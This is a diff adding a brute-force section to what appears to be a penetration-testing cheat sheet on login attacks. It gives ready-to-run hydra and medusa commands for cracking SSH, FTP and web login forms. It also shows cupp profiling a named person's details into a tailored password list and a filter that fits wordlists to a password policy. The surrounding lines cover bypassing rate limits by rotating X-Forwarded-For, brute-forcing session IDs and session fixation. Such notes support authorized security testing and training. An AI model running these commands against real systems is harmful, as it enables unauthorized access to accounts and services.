@@ -30,6 +30,24 @@ curl -H "X-Forwarded-For: 1.2.3.4" http://t/login   # rotate this header to beat
 ```
 CAPTCHA sometimes leaks the answer in HTML/response, or isn't checked server-side. Default creds: check CIRT.net / SecLists.
 
+## Brute-force tools & wordlists
+```bash
+# hydra (network login cracker, many protocols)
+hydra -l admin -P rockyou.txt ssh://<ip>
+hydra -L users.txt -P pass.txt ftp://<ip>
+hydra -l admin -P pass.txt <ip> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
+hydra -C user_pass.txt ssh://<ip>        # combined user:pass file
+# medusa (parallel alternative)
+medusa -h <ip> -U users.txt -P pass.txt -M ssh -t 5
+```
+**Custom wordlists:**
+- `username-anarchy Jane Smith` / `-i names.txt` → likely username formats (feed from SecLists Names).
+- `cupp -i` → profile a target (name, DOB, pet) into a tailored password list.
+- **Filter a list to the password policy** (don't waste guesses on invalid ones):
+  ```bash
+  grep -E '^.{8,}$' wordlist.txt | grep -E '[A-Z]' | grep -E '[0-9]'   # 8+ chars, upper, digit
+  ```
+
 ## Session attacks
 - **Weak session IDs** (low entropy) → brute: `wfuzz -b "sessionid=FUZZ" ...` (slow).
 - **Session fixation:** attacker sets a known session ID, victim logs in with it, attacker reuses it. **Fix: regenerate the session ID on login.**
